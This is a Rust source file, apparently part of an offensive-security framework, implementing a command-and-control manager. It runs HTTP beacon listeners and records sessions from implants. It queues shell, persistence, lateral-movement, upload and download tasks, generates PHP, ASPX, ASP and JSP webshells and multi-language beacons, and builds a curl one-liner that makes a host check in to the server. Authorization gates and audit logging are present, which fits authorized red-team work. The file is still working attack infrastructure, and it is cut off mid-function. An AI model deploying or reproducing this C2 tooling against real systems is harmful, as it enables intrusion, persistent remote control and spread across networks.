use std::collections::HashMap;
use std::net::IpAddr;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;

use serde_json::{json, Value};
use tokio::net::TcpListener;
use tokio::sync::Mutex;

use super::http::{percent_encode, serve_http, BoxFut, HttpRequest, HttpResponse};
use super::store::{
    check_command, ensure_target_allowed, private_ip, write_private,
    C2Store,
};
use super::templates::{
    build_file_command, payload_asp_webshell, payload_aspx_webshell, payload_bash_beacon,
    payload_jsp_webshell, payload_php_beacon, payload_php_webshell, payload_powershell_beacon,
    payload_python_beacon, persistence_command,
};
use super::types::{
    push_event, C2Policy, C2State, Event, Listener, PayloadRecord, Session, Task,
    WebshellConnection,
};
use super::{
    b64, clip, new_id, now_ms, random_token, unb64, BEACON_PULL_LIMIT, OUTPUT_CAP, TASK_CAP,
};

pub struct C2Manager {
    pub(crate) dir: PathBuf,
    pub(crate) store: C2Store,
    running: Mutex<HashMap<String, tokio::task::JoinHandle<()>>>,
    http: reqwest::Client,
}

impl C2Manager {
    pub async fn open(dir: PathBuf) -> std::io::Result<Arc<Self>> {
        let store = C2Store::open(&dir)?;
        let http = reqwest::Client::builder()
            .timeout(Duration::from_secs(35))
            .redirect(reqwest::redirect::Policy::limited(3))
            .danger_accept_invalid_certs(true)
            .build()
            .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;
        Ok(Arc::new(Self {
            dir,
            store,
            running: Mutex::new(HashMap::new()),
            http,
        }))
    }

    pub async fn snapshot(&self) -> C2State {
        self.store.snapshot().await
    }

    // -- listeners ---------------------------------------------------------

    pub async fn restore_listeners(self: &Arc<Self>) {
        let state = self.store.snapshot().await;
        let ids: Vec<String> = state
            .listeners
            .iter()
            .filter(|l| l.status == "running")
            .map(|l| l.id.clone())
            .collect();
        for id in ids {
            let _ = self.start_listener(&id).await;
        }
    }

    pub async fn create_listener(
        self: &Arc<Self>,
        name: &str,
        bind_host: &str,
        bind_port: u16,
        callback_host: &str,
        sleep_seconds: u32,
        jitter_percent: u32,
    ) -> Result<Listener, String> {
        let state = self.store.snapshot().await;
        if !state.policy.enabled {
            return Err(
                "C2 is disabled — run `neurosploit c2 enable --authorization <ref>` first".into(),
            );
        }
        if name.trim().is_empty() {
            return Err("listener name is required".into());
        }
        if bind_port == 0 {
            return Err("bind_port must be 1..65535".into());
        }
        let mut bind = bind_host.trim().to_string();
        if bind.is_empty() {
            bind = "127.0.0.1".into();
        }
        if bind != "127.0.0.1" && bind != "::1" && bind != "localhost" {
            let bind_ip = bind.parse::<IpAddr>().ok();
            let private = bind_ip.map(private_ip).unwrap_or(false);
            if !private && !state.policy.allow_public_targets {
                return Err(format!(
                    "refusing to bind {bind} — use 127.0.0.1 (default), a private address, or enable --allow-public explicitly"
                ));
            }
        }
        let callback = if callback_host.trim().is_empty() {
            if bind == "0.0.0.0" || bind == "::" {
                "127.0.0.1".to_string()
            } else {
                bind.clone()
            }
        } else {
            callback_host.trim().to_string()
        };
        let listener = Listener {
            id: new_id("l"),
            name: name.trim().to_string(),
            kind: "http_beacon".into(),
            bind_host: bind,
            bind_port,
            callback_host: callback,
            token: random_token(),
            status: "stopped".into(),
            sleep_seconds: sleep_seconds.max(1),
            jitter_percent: jitter_percent.min(100),
            created_at: now_ms(),
            started_at: None,
            last_error: None,
        };
        let rec = listener.clone();
        self.store
            .mutate(|s| {
                s.listeners.push(listener);
                push_event(
                    s,
                    "info",
                    "listener",
                    format!(
                        "Listener '{}' created on {}:{}",
                        rec.name, rec.bind_host, rec.bind_port
                    ),
                    json!({"listener_id": rec.id}),
                );
            })
            .await;
        self.store.audit(
            "listener.create",
            json!({"id": rec.id, "name": rec.name, "bind": format!("{}:{}", rec.bind_host, rec.bind_port)}),
        );
        Ok(rec)
    }

    pub async fn start_listener(self: &Arc<Self>, id: &str) -> Result<Listener, String> {
        let state = self.store.snapshot().await;
        let listener = state
            .listeners
            .iter()
            .find(|l| l.id == id)
            .cloned()
            .ok_or_else(|| "listener not found".to_string())?;
        {
            let running = self.running.lock().await;
            if running.contains_key(id) {
                return Err("listener is already running".into());
            }
        }
        let addr = format!("{}:{}", listener.bind_host, listener.bind_port);
        let tcp = TcpListener::bind(&addr)
            .await
            .map_err(|e| format!("bind {addr}: {e}"))?;
        let mgr = self.clone();
        let l = listener.clone();
        let handler: Arc<dyn Fn(HttpRequest) -> BoxFut + Send + Sync> = {
            let mgr = mgr.clone();
            let l = l.clone();
            Arc::new(move |req: HttpRequest| {
                let mgr = mgr.clone();
                let l = l.clone();
                Box::pin(async move { mgr.handle_beacon(&l, req).await }) as BoxFut
            })
        };
        let handle = tokio::spawn(async move {
            if let Err(e) = serve_http(tcp, handler).await {
                eprintln!("[c2] listener {} stopped: {e}", l.id);
            }
        });
        self.running.lock().await.insert(id.to_string(), handle);
        let now = now_ms();
        self.store
            .mutate(|s| {
                if let Some(l) = s.listeners.iter_mut().find(|l| l.id == id) {
                    l.status = "running".into();
                    l.started_at = Some(now);
                    l.last_error = None;
                }
                push_event(
                    s,
                    "info",
                    "listener",
                    format!("Listener '{}' started on {}", listener.name, addr),
                    json!({"listener_id": listener.id}),
                );
            })
            .await;
        self.store
            .audit("listener.start", json!({"id": id, "bind": addr}));
        Ok(self
            .store
            .snapshot()
            .await
            .listeners
            .into_iter()
            .find(|l| l.id == id)
            .unwrap_or(listener))
    }

    pub async fn stop_listener(&self, id: &str) -> Result<(), String> {
        let handle = self.running.lock().await.remove(id);
        match handle {
            Some(h) => {
                h.abort();
                self.store
                    .mutate(|s| {
                        if let Some(l) = s.listeners.iter_mut().find(|l| l.id == id) {
                            l.status = "stopped".into();
                        }
                        push_event(
                            s,
                            "info",
                            "listener",
                            format!("Listener {id} stopped"),
                            json!({"listener_id": id}),
                        );
                    })
                    .await;
                self.store.audit("listener.stop", json!({"id": id}));
                Ok(())
            }
            None => {
                self.store
                    .mutate(|s| {
                        if let Some(l) = s.listeners.iter_mut().find(|l| l.id == id) {
                            l.status = "stopped".into();
                        }
                    })
                    .await;
                Err("listener is not running".into())
            }
        }
    }

    pub async fn delete_listener(&self, id: &str) -> Result<(), String> {
        let _ = self.stop_listener(id).await;
        let found = self
            .store
            .mutate(|s| {
                let before = s.listeners.len();
                s.listeners.retain(|l| l.id != id);
                let session_ids: Vec<String> = s
                    .sessions
                    .iter()
                    .filter(|x| x.listener_id == id)
                    .map(|x| x.id.clone())
                    .collect();
                s.sessions.retain(|x| x.listener_id != id);
                s.tasks.retain(|t| !session_ids.contains(&t.session_id));
                before != s.listeners.len()
            })
            .await;
        if !found {
            return Err("listener not found".into());
        }
        self.store.audit("listener.delete", json!({"id": id}));
        Ok(())
    }

    // -- beacon protocol ---------------------------------------------------

    pub(crate) async fn handle_beacon(
        self: Arc<Self>,
        listener: &Listener,
        req: HttpRequest,
    ) -> HttpResponse {
        let wants_sh = req
            .query
            .get("format")
            .map(|f| f == "sh")
            .unwrap_or(false)
            || req
                .header("accept")
                .map(|a| a.contains("text/plain") && !a.contains("json"))
                .unwrap_or(false);
        if req.method == "GET" && (req.path == "/" || req.path == "/health") {
            return HttpResponse::json(200, &json!({"ok": true, "listener": listener.name}));
        }
        if req.method == "GET"
            && (req.path == "/api/beacon" || req.path == "/check_in" || req.path == "/tasks")
        {
            let sid = req
                .query
                .get("session_id")
                .cloned()
                .or_else(|| req.header("x-session-id").map(|s| s.to_string()))
                .unwrap_or_default();
            if sid.is_empty() {
                return HttpResponse::json(400, &json!({"ok": false, "error": "session_id required"}));
            }
            if !self.token_ok(listener, &req) {
                return HttpResponse::json(401, &json!({"ok": false, "error": "invalid implant token"}));
            }
            let tasks = self.pop_tasks(&sid, listener).await;
            return HttpResponse::json(200, &json!({"ok": true, "tasks": tasks}));
        }
        if req.method != "POST" {
            return HttpResponse::json(405, &json!({"ok": false, "error": "method not allowed"}));
        }
        if !self.token_ok(listener, &req) {
            return HttpResponse::json(401, &json!({"ok": false, "error": "invalid implant token"}));
        }

        // Two encodings accepted: JSON (python/powershell/php beacons) and
        // urlencoded form (the dependency-free bash beacon). Both carry the
        // same fields; a result report can ride along with the check-in.
        let (checkin, results) = if req
            .header("content-type")
            .map(|c| c.contains("application/x-www-form-urlencoded"))
            .unwrap_or(false)
        {
            let f = req.form();
            let s = |k: &str| f.get(k).cloned().unwrap_or_default();
            let ci = json!({
                "uuid": s("uuid"),
                "hostname": s("hostname"),
                "username": s("username"),
                "os": s("os"),
                "arch": s("arch"),
                "pid": s("pid").parse::<i64>().unwrap_or(0),
                "process_name": s("process_name"),
                "is_admin": s("is_admin") == "1",
                "internal_ip": s("internal_ip"),
                "sleep_seconds": s("sleep_seconds").parse::<u32>().unwrap_or(0),
                "jitter_percent": s("jitter_percent").parse::<u32>().unwrap_or(0),
            });
            let mut out = Vec::new();
            if let Some(tid) = f.get("result_task_id") {
                if !tid.is_empty() {
                    let output = f
                        .get("result_output_b64")
                        .and_then(|v| unb64(v))
                        .map(|b| String::from_utf8_lossy(&b).to_string())
                        .unwrap_or_else(|| f.get("result_output").cloned().unwrap_or_default());
                    out.push(json!({
                        "task_id": tid,
                        "success": f.get("result_success").map(|v| v == "1").unwrap_or(false),
                        "output": output,
                        "error": f.get("result_error").cloned().unwrap_or_default(),
                    }));
                }
            }
            (ci, out)
        } else {
            let Ok(v) = serde_json::from_slice::<Value>(&req.body) else {
                return HttpResponse::json(400, &json!({"ok": false, "error": "invalid JSON"}));
            };
            let ci = v.clone();
            let results = v
                .get("results")
                .and_then(|r| r.as_array())
                .cloned()
                .unwrap_or_default();
            (ci, results)
        };

        let uuid = checkin
            .get("uuid")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .trim()
            .to_string();
        if uuid.is_empty() {
            return HttpResponse::json(400, &json!({"ok": false, "error": "uuid required"}));
        }

        self.process_results(listener, &results).await;
        let (session, tasks) = self.ingest_checkin(listener, &checkin, &uuid).await;
        let sleep_s = session.sleep_seconds.max(1);
        let jitter = session.jitter_percent;
        if wants_sh {
            let mut out = format!("SID={}\nSLEEP={}\nJITTER={}\n", session.id, sleep_s, jitter);
            for t in &tasks {
                let payload = serde_json::to_vec(&t.payload).unwrap_or_else(|_| b"{}".to_vec());
                out.push_str(&format!("TASK {} {} {}\n", t.id, t.task_type, b64(&payload)));
            }
            HttpResponse::text(200, out)
        } else {
            HttpResponse::json(
                200,
                &json!({
                    "ok": true,
                    "session_id": session.id,
                    "next_sleep": sleep_s,
                    "next_jitter": jitter,
                    "server_time": now_ms(),
                    "tasks": tasks.iter().map(|t| json!({
                        "task_id": t.id,
                        "task_type": t.task_type,
                        "payload": t.payload,
                    })).collect::<Vec<_>>(),
                }),
            )
        }
    }

    fn token_ok(&self, listener: &Listener, req: &HttpRequest) -> bool {
        let got = req
            .header("x-implant-token")
            .or_else(|| {
                req.header("authorization")
                    .and_then(|v| v.strip_prefix("Bearer "))
            })
            .unwrap_or("");
        let a = got.as_bytes();
        let b = listener.token.as_bytes();
        if a.len() != b.len() {
            return false;
        }
        let mut diff = 0u8;
        for (x, y) in a.iter().zip(b.iter()) {
            diff |= x ^ y;
        }
        diff == 0
    }

    async fn ingest_checkin(
        &self,
        listener: &Listener,
        ci: &Value,
        uuid: &str,
    ) -> (Session, Vec<Task>) {
        let now = now_ms();
        let internal_ip = ci
            .get("internal_ip")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let hostname = ci
            .get("hostname")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown")
            .to_string();
        let username = ci
            .get("username")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown")
            .to_string();
        let os = ci
            .get("os")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown")
            .to_ascii_lowercase();
        let arch = ci
            .get("arch")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let pid = ci.get("pid").and_then(|v| v.as_i64()).unwrap_or(0);
        let process_name = ci
            .get("process_name")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let is_admin = ci
            .get("is_admin")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        let reported_sleep = ci
            .get("sleep_seconds")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;
        let reported_jitter = ci
            .get("jitter_percent")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;

        let state = self.store.snapshot().await;
        let existing = state
            .sessions
            .iter()
            .find(|s| s.implant_uuid == uuid)
            .cloned();
        if state.sessions.len() >= state.policy.max_sessions.max(1) && existing.is_none() {
            // Cap the session table so a beacon storm cannot grow state forever.
            let id = new_id("s");
            return (
                Session {
                    id,
                    listener_id: listener.id.clone(),
                    implant_uuid: uuid.to_string(),
                    hostname,
                    username,
                    os,
                    arch,
                    pid,
                    process_name,
                    is_admin,
                    internal_ip,
                    status: "rejected".into(),
                    first_seen: now,
                    last_seen: now,
                    sleep_seconds: listener.sleep_seconds,
                    jitter_percent: listener.jitter_percent,
                    note: "session cap reached".into(),
                    metadata: json!({}),
                },
                Vec::new(),
            );
        }
        let first_seen = existing.as_ref().map(|s| s.first_seen).unwrap_or(now);
        let id = existing
            .as_ref()
            .map(|s| s.id.clone())
            .unwrap_or_else(|| new_id("s"));
        let sleep_seconds = existing
            .as_ref()
            .map(|s| s.sleep_seconds)
            .filter(|v| *v > 0)
            .unwrap_or_else(|| {
                if reported_sleep > 0 {
                    reported_sleep
                } else {
                    listener.sleep_seconds
                }
            });
        let jitter_percent = existing
            .as_ref()
            .map(|s| s.jitter_percent)
            .unwrap_or(if reported_jitter > 0 {
                reported_jitter
            } else {
                listener.jitter_percent
            });
        let note = existing.as_ref().map(|s| s.note.clone()).unwrap_or_default();
        let session = Session {
            id: id.clone(),
            listener_id: listener.id.clone(),
            implant_uuid: uuid.to_string(),
            hostname,
            username,
            os,
            arch,
            pid,
            process_name,
            is_admin,
            internal_ip,
            status: "active".into(),
            first_seen,
            last_seen: now,
            sleep_seconds: sleep_seconds.max(1),
            jitter_percent,
            note,
            metadata: ci.clone(),
        };
        let is_new = existing.is_none();
        let sess = session.clone();
        self.store
            .mutate(|s| {
                if let Some(slot) = s.sessions.iter_mut().find(|x| x.implant_uuid == uuid) {
                    *slot = sess.clone();
                } else {
                    s.sessions.push(sess.clone());
                }
                if is_new {
                    push_event(
                        s,
                        "critical",
                        "session",
                        format!(
                            "New session: {}@{} ({}/{})",
                            sess.username, sess.hostname, sess.os, sess.arch
                        ),
                        json!({"session_id": sess.id, "listener_id": sess.listener_id, "internal_ip": sess.internal_ip}),
                    );
                }
            })
            .await;
        if is_new {
            self.store.audit(
                "session.first_seen",
                json!({"id": sess.id, "hostname": sess.hostname, "username": sess.username, "listener_id": sess.listener_id}),
            );
        }
        let tasks = self.pop_tasks(&id, listener).await;
        (session, tasks)
    }

    async fn pop_tasks(&self, session_id: &str, listener: &Listener) -> Vec<Task> {
        let now = now_ms();
        let session_listener = self
            .store
            .snapshot()
            .await
            .sessions
            .iter()
            .find(|s| s.id == session_id)
            .map(|s| s.listener_id.clone());
        if session_listener.as_deref() != Some(listener.id.as_str()) {
            return Vec::new();
        }
        self.store
            .mutate(|s| {
                let mut out = Vec::new();
                for t in s.tasks.iter_mut() {
                    if t.session_id != session_id || t.status != "queued" {
                        continue;
                    }
                    if out.len() >= BEACON_PULL_LIMIT {
                        break;
                    }
                    t.status = "sent".into();
                    t.sent_at = Some(now);
                    out.push(t.clone());
                }
                out
            })
            .await
    }

    async fn process_results(&self, listener: &Listener, results: &[Value]) {
        if results.is_empty() {
            return;
        }
        let mut newly_done: Vec<Task> = Vec::new();
        self.store
            .mutate(|s| {
                for r in results {
                    let Some(tid) = r.get("task_id").and_then(|v| v.as_str()) else {
                        continue;
                    };
                    let Some(t) = s.tasks.iter_mut().find(|t| t.id == tid) else {
                        continue;
                    };
                    if t.status == "cancelled" {
                        continue;
                    }
                    let success = r
                        .get("success")
                        .and_then(|v| v.as_bool())
                        .unwrap_or(false);
                    let output = r
                        .get("output_b64")
                        .and_then(|v| v.as_str())
                        .and_then(unb64)
                        .map(|b| String::from_utf8_lossy(&b).to_string())
                        .or_else(|| {
                            r.get("output")
                                .and_then(|v| v.as_str())
                                .map(|v| v.to_string())
                        })
                        .unwrap_or_default();
                    t.status = if success { "success".into() } else { "failed".into() };
                    t.output = clip(output);
                    t.error = clip(
                        r.get("error")
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string(),
                    );
                    t.completed_at = Some(now_ms());
                    newly_done.push(t.clone());
                }
                for t in &newly_done {
                    push_event(
                        s,
                        if t.status == "success" { "info" } else { "warn" },
                        "task",
                        format!("Task {} {} on {}", t.id, t.status, t.session_id),
                        json!({"task_id": t.id, "session_id": t.session_id, "task_type": t.task_type}),
                    );
                }
            })
            .await;
        for t in newly_done {
            self.store.audit(
                "task.result",
                json!({"task_id": t.id, "session_id": t.session_id, "status": t.status, "listener_id": listener.id}),
            );
        }
    }

    // -- sessions ----------------------------------------------------------

    pub async fn reconcile(&self) {
        let now = now_ms();
        self.store
            .mutate(|s| {
                for sess in s.sessions.iter_mut() {
                    if sess.status == "active" {
                        let budget = (sess.sleep_seconds.max(5) as i64) * 1000 * 8;
                        if now - sess.last_seen > budget.max(120_000) {
                            sess.status = "dead".into();
                        }
                    }
                }
                for t in s.tasks.iter_mut() {
                    if t.status == "sent" {
                        if let Some(sent) = t.sent_at {
                            if now - sent > 15 * 60 * 1000 {
                                t.status = "failed".into();
                                t.error = "timeout: implant did not return a result".into();
                                t.completed_at = Some(now);
                            }
                        }
                    }
                }
            })
            .await;
    }

    pub async fn set_session_sleep(
        &self,
        session_id: &str,
        seconds: u32,
        jitter: u32,
    ) -> Result<Task, String> {
        let seconds = seconds.max(1);
        let jitter = jitter.min(100);
        self.store
            .mutate(|s| {
                if let Some(sess) = s.sessions.iter_mut().find(|x| x.id == session_id) {
                    sess.sleep_seconds = seconds;
                    sess.jitter_percent = jitter;
                }
            })
            .await;
        self.enqueue(
            session_id,
            "sleep",
            json!({"seconds": seconds, "jitter": jitter}),
            "manual",
        )
        .await
    }

    pub async fn set_session_note(&self, session_id: &str, note: &str) -> Result<(), String> {
        let found = self
            .store
            .mutate(|s| {
                if let Some(sess) = s.sessions.iter_mut().find(|x| x.id == session_id) {
                    sess.note = note.to_string();
                    true
                } else {
                    false
                }
            })
            .await;
        if !found {
            return Err("session not found".into());
        }
        self.store.audit("session.note", json!({"id": session_id}));
        Ok(())
    }

    pub async fn kill_session(&self, session_id: &str) -> Result<(), String> {
        let found = self
            .store
            .mutate(|s| {
                if let Some(sess) = s.sessions.iter_mut().find(|x| x.id == session_id) {
                    sess.status = "killed".into();
                    true
                } else {
                    false
                }
            })
            .await;
        if !found {
            return Err("session not found".into());
        }
        self.stop_session_tasks(session_id).await;
        self.store.audit("session.kill", json!({"id": session_id}));
        Ok(())
    }

    async fn stop_session_tasks(&self, session_id: &str) {
        self.store
            .mutate(|s| {
                for t in s.tasks.iter_mut() {
                    if t.session_id == session_id
                        && (t.status == "queued" || t.status == "sent")
                    {
                        t.status = "cancelled".into();
                        t.error = "session killed".into();
                        t.completed_at = Some(now_ms());
                    }
                }
            })
            .await;
    }

    // -- tasks -------------------------------------------------------------

    pub async fn enqueue(
        &self,
        session_id: &str,
        task_type: &str,
        payload: Value,
        source: &str,
    ) -> Result<Task, String> {
        let state = self.store.snapshot().await;
        if !state.policy.enabled {
            return Err("C2 is disabled".into());
        }
        let session = state
            .sessions
            .iter()
            .find(|s| s.id == session_id)
            .cloned()
            .ok_or_else(|| "session not found".to_string())?;
        if session.status == "dead" || session.status == "killed" {
            return Err("session is not active".into());
        }
        let mut task_type = task_type.trim().to_ascii_lowercase();
        let mut payload = payload;
        match task_type.as_str() {
            "exec" | "shell" | "lateral" => {
                let cmd = payload
                    .get("command")
                    .and_then(|v| v.as_str())
                    .unwrap_or("");
                if cmd.trim().is_empty() {
                    return Err("command is required".into());
                }
                check_command(&state, cmd)?;
                if task_type == "lateral" && !state.policy.allow_lateral {
                    return Err("lateral movement is disabled for this engagement — enable it with `neurosploit c2 enable --authorization ... --lateral`".into());
                }
            }
            "persist" => {
                if !state.policy.allow_persistence {
                    return Err("persistence is disabled for this engagement — enable it with `neurosploit c2 enable --authorization ... --persistence`".into());
                }
                let method = payload
                    .get("method")
                    .and_then(|v| v.as_str())
                    .unwrap_or("auto")
                    .to_string();
                let Some(listener) = state.listeners.iter().find(|l| l.id == session.listener_id)
                else {
                    return Err("listener for this session no longer exists".into());
                };
                let command = persistence_command(&session.os, &method, listener, &session)?;
                check_command(&state, &command)?;
                payload = json!({"method": method, "command": command});
            }
            "upload" => {
                if !state.policy.allow_lateral {
                    return Err("file upload to an implant is disabled — enable lateral capabilities first".into());
                }
                let path = payload
                    .get("path")
                    .or_else(|| payload.get("remote_path"))
                    .and_then(|v| v.as_str())
                    .unwrap_or("");
                if path.is_empty() {
                    return Err("upload requires path".into());
                }
                if let Some(content) = payload.get("content").and_then(|v| v.as_str()) {
                    if !content.is_empty() && payload.get("content_b64").is_none() {
                        payload["content_b64"] = json!(b64(content.as_bytes()));
                    }
                }
            }
            "download" => {
                let path = payload
                    .get("path")
                    .or_else(|| payload.get("remote_path"))
                    .and_then(|v| v.as_str())
                    .unwrap_or("");
                if path.is_empty() {
                    return Err("download requires path".into());
                }
            }
            "sleep" | "exit" | "pwd" | "ls" | "cd" | "ps" | "kill_proc" => {}
            other => return Err(format!("unsupported task_type '{other}'")),
        }
        if task_type == "shell" {
            task_type = "exec".into();
        }
        let task = Task {
            id: new_id("t"),
            session_id: session_id.to_string(),
            task_type,
            payload,
            status: "queued".into(),
            source: source.to_string(),
            created_at: now_ms(),
            sent_at: None,
            completed_at: None,
            output: String::new(),
            error: String::new(),
        };
        let t = task.clone();
        self.store
            .mutate(|s| {
                s.tasks.push(task);
                if s.tasks.len() > TASK_CAP {
                    let drop = s.tasks.len() - TASK_CAP;
                    s.tasks.drain(0..drop);
                }
                push_event(
                    s,
                    "info",
                    "task",
                    format!("Task {} queued on {}", t.id, t.session_id),
                    json!({"task_id": t.id, "session_id": t.session_id, "task_type": t.task_type}),
                );
            })
            .await;
        self.store.audit(
            "task.enqueue",
            json!({"task_id": t.id, "session_id": t.session_id, "task_type": t.task_type, "source": source}),
        );
        Ok(t)
    }

    pub async fn task(&self, task_id: &str) -> Option<Task> {
        self.store
            .snapshot()
            .await
            .tasks
            .into_iter()
            .find(|t| t.id == task_id)
    }

    pub async fn wait_task(&self, task_id: &str, timeout: Duration) -> Result<Task, String> {
        let deadline = std::time::Instant::now() + timeout;
        loop {
            if let Some(t) = self.task(task_id).await {
                if matches!(t.status.as_str(), "success" | "failed" | "cancelled") {
                    return Ok(t);
                }
                if std::time::Instant::now() >= deadline {
                    return Ok(t);
                }
            } else {
                return Err("task not found".into());
            }
            tokio::time::sleep(Duration::from_millis(500)).await;
        }
    }

    pub async fn cancel_task(&self, task_id: &str) -> Result<(), String> {
        let found = self
            .store
            .mutate(|s| {
                if let Some(t) = s.tasks.iter_mut().find(|t| t.id == task_id) {
                    if t.status == "queued" {
                        t.status = "cancelled".into();
                        t.completed_at = Some(now_ms());
                        true
                    } else {
                        false
                    }
                } else {
                    false
                }
            })
            .await;
        if !found {
            return Err("task not found or already dispatched".into());
        }
        self.store.audit("task.cancel", json!({"task_id": task_id}));
        Ok(())
    }

    // -- events ------------------------------------------------------------

    pub async fn events(&self, limit: usize) -> Vec<Event> {
        let state = self.store.snapshot().await;
        let n = limit.max(1).min(super::EVENT_CAP);
        let start = state.events.len().saturating_sub(n);
        state.events[start..].to_vec()
    }

    // -- payloads ----------------------------------------------------------

    fn write_payload(&self, name: &str, content: &str) -> Result<PathBuf, String> {
        let safe: String = name
            .chars()
            .map(|c| {
                if c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == '_' {
                    c
                } else {
                    '_'
                }
            })
            .collect();
        let safe = if safe.trim_matches('_').is_empty() {
            format!("payload-{}.txt", now_ms())
        } else {
            safe
        };
        let dir = self.dir.join("payloads");
        std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
        let path = dir.join(&safe);
        write_private(&path, content.as_bytes()).map_err(|e| e.to_string())?;
        Ok(path)
    }

    fn record_payload(&self, name: &str, kind: &str, size: usize, note: &str) {
        if let Ok(mut s) = self.store.state.try_write() {
            s.payloads.push(PayloadRecord {
                name: name.to_string(),
                kind: kind.to_string(),
                created_at: now_ms(),
                size,
                note: note.to_string(),
            });
            if s.payloads.len() > 500 {
                let drop = s.payloads.len() - 500;
                s.payloads.drain(0..drop);
            }
        }
    }

    pub async fn payload_webshell(
        &self,
        shell_type: &str,
        password: &str,
        pass_param: &str,
        cmd_param: &str,
        filename: Option<&str>,
    ) -> Result<Value, String> {
        let state = self.store.snapshot().await;
        if !state.policy.enabled {
            return Err("C2/WebShell is disabled — enable it explicitly first".into());
        }
        let t = shell_type.trim().to_ascii_lowercase();
        let pass = if password.trim().is_empty() {
            "ns_pass"
        } else {
            password.trim()
        };
        let cmd = if cmd_param.trim().is_empty() {
            "cmd"
        } else {
            cmd_param.trim()
        };
        let pparam = if pass_param.trim().is_empty() {
            "pass"
        } else {
            pass_param.trim()
        };
        let (content, ext) = match t.as_str() {
            "php" => (payload_php_webshell(pass, pparam, cmd), "php"),
            "aspx" | "asp.net" => (payload_aspx_webshell(pass, pparam, cmd), "aspx"),
            "asp" => (payload_asp_webshell(pass, pparam, cmd), "asp"),
            "jsp" => (payload_jsp_webshell(pass, pparam, cmd), "jsp"),
            other => {
                return Err(format!(
                    "unsupported webshell type '{other}' (php, aspx, asp, jsp)"
                ))
            }
        };
        let name = filename
            .map(|f| f.to_string())
            .unwrap_or_else(|| format!("webshell-{}.{}", now_ms(), ext));
        let path = self.write_payload(&name, &content)?;
        let size = content.len();
        self.record_payload(&name, "webshell", size, &format!("type={t}"));
        self.store.audit(
            "payload.webshell",
            json!({"name": name, "type": t, "path": path, "authorization": state.policy.authorized_by}),
        );
        Ok(json!({
            "ok": true,
            "name": name,
            "kind": "webshell",
            "type": t,
            "path": path,
            "content": content,
            "password": pass,
            "pass_param": pparam,
            "cmd_param": cmd,
            "note": "Deploy only on systems you are authorized to test. Generated payload is stored with 0600 permissions.",
        }))
    }

    pub async fn payload_beacon(
        &self,
        listener_id: &str,
        kind: &str,
        host_override: Option<&str>,
        filename: Option<&str>,
    ) -> Result<Value, String> {
        let state = self.store.snapshot().await;
        if !state.policy.enabled {
            return Err("C2 is disabled — enable it explicitly first".into());
        }
        let listener = state
            .listeners
            .iter()
            .find(|l| l.id == listener_id)
            .cloned()
            .ok_or_else(|| "listener not found".to_string())?;
        let host = host_override
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .unwrap_or_else(|| listener.callback_host.clone());
        let base = format!("http://{}:{}", host, listener.bind_port);
        let k = kind.trim().to_ascii_lowercase();
        let (content, ext) = match k.as_str() {
            "" | "bash" | "sh" => (
                payload_bash_beacon(
                    &base,
                    &listener.token,
                    listener.sleep_seconds,
                    listener.jitter_percent,
                ),
                "sh",
            ),
            "python" | "python3" => (
                payload_python_beacon(
                    &base,
                    &listener.token,
                    listener.sleep_seconds,
                    listener.jitter_percent,
                ),
                "py",
            ),
            "powershell" | "ps1" => (
                payload_powershell_beacon(
                    &base,
                    &listener.token,
                    listener.sleep_seconds,
                    listener.jitter_percent,
                ),
                "ps1",
            ),
            "php" => (
                payload_php_beacon(
                    &base,
                    &listener.token,
                    listener.sleep_seconds,
                    listener.jitter_percent,
                ),
                "php",
            ),
            other => {
                return Err(format!(
                    "unsupported beacon kind '{other}' (bash, python, powershell, php)"
                ))
            }
        };
        let name = filename
            .map(|f| f.to_string())
            .unwrap_or_else(|| format!("beacon-{}.{}", now_ms(), ext));
        let path = self.write_payload(&name, &content)?;
        let size = content.len();
        self.record_payload(
            &name,
            "beacon",
            size,
            &format!("listener={} kind={k}", listener.id),
        );
        self.store.audit(
            "payload.beacon",
            json!({"name": name, "listener_id": listener.id, "kind": k, "callback": base}),
        );
        Ok(json!({
            "ok": true,
            "name": name,
            "kind": "beacon",
            "transport": "http_beacon",
            "language": k,
            "path": path,
            "content": content,
            "callback": base,
            "listener_id": listener.id,
            "note": "The beacon checks in to the listener, pulls tasks, and reports results. Run it only on authorized hosts.",
        }))
    }

    pub async fn payload_oneliner(&self, listener_id: &str) -> Result<Value, String> {
        let state = self.store.snapshot().await;
        if !state.policy.enabled {
            return Err("C2 is disabled — enable it explicitly first".into());
        }
        let listener = state
            .listeners
            .iter()
            .find(|l| l.id == listener_id)
            .cloned()
            .ok_or_else(|| "listener not found".to_string())?;
        let base = format!(
            "http://{}:{}",
            listener.callback_host, listener.bind_port
        );
        let oneliner = format!(
            "curl -fsSk -H 'X-Implant-Token: {token}' -H 'Content-Type: application/json' -X POST '{base}/api/beacon' -d '{{\"uuid\":\"$(hostname)-$$\"}}' >/dev/null 2>&1",
            token = listener.token,
            base = base
        );
        self.store
            .audit("payload.oneliner", json!({"listener_id": listener.id}));
        Ok(json!({
            "ok": true,
            "kind": "oneliner",
            "listener_id": listener.id,
            "callback": base,
            "oneliner": oneliner,
            "note": "One-shot check-in. For a persistent channel use `payload beacon` instead.",
        }))
    }

    pub fn payload_path(&self, name: &str) -> Option<PathBuf> {
        let safe: String = name
            .chars()
            .map(|c| {
                if c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == '_' {
                    c
                } else {
                    '_'
                }
            })
            .collect();
        let p = self.dir.join("payloads").join(safe);
        if p.is_file() {
            Some(p)
        } else {
            None
        }
    }

    // -- webshells ---------------------------------------------------------

    pub async fn add_webshell(
        &self,
        name: &str,
        url: &str,
        password: &str,
        shell_type: &str,
        method: &str,
        cmd_param: &str,
        pass_param: &str,
        encoding: &str,
